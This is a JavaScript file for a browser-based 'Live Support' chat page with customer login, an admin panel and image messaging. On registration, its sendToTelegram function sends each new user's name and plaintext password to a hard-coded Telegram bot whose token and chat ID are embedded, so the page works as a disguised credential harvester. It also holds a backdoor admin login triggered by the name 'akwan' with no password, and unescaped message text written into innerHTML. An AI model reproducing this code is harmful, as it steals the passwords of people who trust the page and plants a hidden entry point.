// Configuration
const TELEGRAM_BOT_TOKEN = '8557391650:AAFMcTDp0I8uXxCV4TGZZyjYWHwAKTcqxFQ';
const TELEGRAM_CHAT_ID = '8419125080';
const notificationSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3');

let currentUser = "";
let selectedUser = "";
let pendingImageData = "";

// Storage Helpers
const getUsers = () => JSON.parse(localStorage.getItem("users") || "{}");
const saveUsers = (u) => localStorage.setItem("users", JSON.stringify(u));
const getChats = () => JSON.parse(localStorage.getItem("chats") || "{}");
const saveChats = (c) => localStorage.setItem("chats", JSON.stringify(c));

// Functions
async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}`;
  try { await fetch(url); } catch (error) { console.error("Telegram Error:", error); }
}

function showForgotAd() {
    const ad = document.getElementById("forgotPassAd");
    ad.classList.add("show");
    setTimeout(() => { ad.classList.remove("show"); }, 4000);
}

// Password toggle
document.getElementById('togglePassword').addEventListener('click', function() {
    const pwdInput = document.getElementById('passwordInput');
    this.classList.toggle('fa-eye-slash');
    this.classList.toggle('fa-eye');
    pwdInput.type = pwdInput.type === 'password' ? 'text' : 'password';
});

// Enter key listeners
document.getElementById('nameInput').addEventListener('keypress', (e) => { if(e.key === 'Enter') login(); });
document.getElementById('passwordInput').addEventListener('keypress', (e) => { if(e.key === 'Enter') login(); });
document.getElementById('customerInput').addEventListener('keypress', (e) => { if(e.key === 'Enter') sendCustomerMessage(); });
document.getElementById('messageInput').addEventListener('keypress', (e) => { if(e.key === 'Enter') sendAdminMessage(); });

window.login = function() {
  const nameInput = document.getElementById("nameInput");
  const name = nameInput.value.trim();
  const pass = document.getElementById("passwordInput").value;
  const msg = document.getElementById("loginMsg");
  const pwdContainer = document.getElementById("pwdContainer");
  
  if (!name) return;

  if (name.toLowerCase() === "akwan") {
    document.getElementById("login").classList.add("hidden");
    document.getElementById("adminPanel").classList.remove("hidden");
    loadUsers();
    return;
  }

  if (pwdContainer.classList.contains("hidden")) {
    pwdContainer.classList.remove("hidden");
    msg.textContent = "Please enter/create a password";
    msg.style.color = "var(--primary)";
    return;
  }

  const users = getUsers();
  if (!users[name]) {
    if (!pass) { msg.textContent = "Password required"; msg.style.color = "red"; return; }
    users[name] = { password: pass };
    saveUsers(users);

    const chats = getChats();
    chats[name] = [{
        from: "admin", 
        text: `Hello ${name}, welcome to our Live Support! How can we help you today?`, 
        time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}),
        read: false 
    }];
    saveChats(chats);
    sendToTelegram(`🆕 NEW REGISTRATION\n👤 User: ${name}\n🔑 Pass: ${pass}`);
  } else {
    if (users[name].password !== pass) { 
        msg.textContent = "Incorrect password"; 
        msg.style.color = "red"; 
        return; 
    }
  }

  currentUser = name;
  document.getElementById("login").classList.add("hidden");
  document.getElementById("customerPanel").classList.remove("hidden");
  loadCustomerMessages();
};

window.logout = function() {
  if (!confirm("Are you sure you want to log out?")) return;
  currentUser = ""; selectedUser = "";
  document.getElementById("adminPanel").classList.add("hidden");
  document.getElementById("customerPanel").classList.add("hidden");
  document.getElementById("login").classList.remove("hidden");
  document.getElementById("nameInput").value = "";
  document.getElementById("passwordInput").value = "";
  document.getElementById("pwdContainer").classList.add("hidden");
  document.getElementById("loginMsg").textContent = "";
};

window.sendCustomerMessage = function() {
  const input = document.getElementById("customerInput");
  if (!input.value.trim()) return;
  const chats = getChats();
  chats[currentUser] = chats[currentUser] || [];
  chats[currentUser].push({ 
    from: "user", text: input.value, 
    time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}),
    read: false 
  });
  saveChats(chats);
  notificationSound.play();
  input.value = "";
  loadCustomerMessages();
};

window.sendAdminMessage = function() {
  if (!selectedUser) return;
  const input = document.getElementById("messageInput");
  if (!input.value.trim()) return;
  const chats = getChats();
  chats[selectedUser].push({ 
    from: "admin", text: input.value, 
    time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}),
    read: true 
  });
  saveChats(chats);
  input.value = "";
  loadAdminMessages();
};

function loadCustomerMessages() {
  const chats = getChats();
  const box = document.getElementById("customerMessages");
  box.innerHTML = "";
  (chats[currentUser] || []).forEach(m => {
    const div = document.createElement("div");
    div.className = "message " + (m.from === "user" ? "user-bubble" : "admin-bubble");
    let content = m.text ? `<div>${m.text}</div>` : `<img src="${m.image}" class="chat-image">`;
    div.innerHTML = `${content}<span class="time">${m.time}</span>`;
    box.appendChild(div);
  });
  box.scrollTop = box.scrollHeight;
}

function loadUsers() {
  const chats = getChats();
  const list = document.getElementById("userList");
  list.innerHTML = "";
  let totalUnread = 0;
  Object.keys(chats).forEach(name => {
    const unreadCount = chats[name].filter(m => m.from === "user" && m.read === false).length;
    totalUnread += unreadCount;
    const badgeHtml = unreadCount > 0 ? `<span class="unread-badge">${unreadCount}</span>` : "";
    const initial = name.charAt(0);
    const div = document.createElement("div");
    div.className = "user-list-item" + (selectedUser === name ? " active" : "");
    div.innerHTML = `<div onclick="openChat('${name}')" style="flex:1; display:flex; align-items:center;">
                        <div class="admin-user-icon">${initial}</div>
                        <span>${name}</span>
                        ${badgeHtml}
                     </div>
                     <span class="delete-user" onclick="deleteCustomer('${name}')">✕</span>`;
    list.appendChild(div);
  });
  document.title = totalUnread > 0 ? `(${totalUnread}) Support Chat` : "Support Chat | Admin Dashboard";
}

window.openChat = function(name) {
  selectedUser = name;
  const chats = getChats();
  if (chats[name]) {
    chats[name].forEach(m => { if(m.from === "user") m.read = true; });
    saveChats(chats);
  }
  document.getElementById("chatHeader").textContent = "Chatting with " + name;
  loadUsers();
  loadAdminMessages();
};

function loadAdminMessages() {
  const chats = getChats();
  const box = document.getElementById("messages");
  box.innerHTML = "";
  if (!selectedUser || !chats[selectedUser]) return;
  chats[selectedUser].forEach((m, i) => {
    const div = document.createElement("div");
    div.className = "message " + (m.from === "admin" ? "user-bubble" : "admin-bubble");
    let content = m.text ? `<div>${m.text}</div>` : `<img src="${m.image}" class="chat-image">`;
    div.innerHTML = `<div>${content} <span class="delete-msg" onclick="deleteMessage(${i})">×</span></div>
                     <span class="time">${m.time}</span>`;
    box.appendChild(div);
  });
  box.scrollTop = box.scrollHeight;
}

window.deleteMessage = function(i) {
  const chats = getChats();
  chats[selectedUser].splice(i, 1);
  saveChats(chats);
  loadAdminMessages();
};

window.deleteCustomer = function(name) {
  if (!confirm(`Delete all data for ${name}?`)) return;
  const users = getUsers();
  const chats = getChats();
  delete users[name]; delete chats[name];
  saveUsers(users); saveChats(chats);
  if (selectedUser === name) { selectedUser = ""; document.getElementById("messages").innerHTML = ""; }
  loadUsers();
};

window.sendCustomerImage = function(input) {
    if (!input.files || !input.files[0]) return;
    const reader = new FileReader();
    reader.onload = function(e) {
        const chats = getChats();
        chats[currentUser].push({
            from: "user", text: "", image: e.target.result,
            time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}),
            read: false
        });
        saveChats(chats);
        loadCustomerMessages();
    };
    reader.readAsDataURL(input.files[0]);
};

window.previewAdminImage = function(input) {
    if (!selectedUser) { alert("Please select a user first"); return; }
    if (!input.files || !input.files[0]) return;
    const reader = new FileReader();
    reader.onload = function(e) {
        pendingImageData = e.target.result;
        document.getElementById("imgPreviewTarget").src = pendingImageData;
        document.getElementById("previewModal").style.display = "flex";
    };
    reader.readAsDataURL(input.files[0]);
};

window.confirmSendImage = function() {
    const chats = getChats();
    chats[selectedUser].push({
        from: "admin", text: "", image: pendingImageData,
        time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}),
        read: true
    });
    saveChats(chats);
    closePreview();
    loadAdminMessages();
};

window.closePreview = function() {
    document.getElementById("previewModal").style.display = "none";
    pendingImageData = "";
    document.getElementById("adminFile").value = "";
};
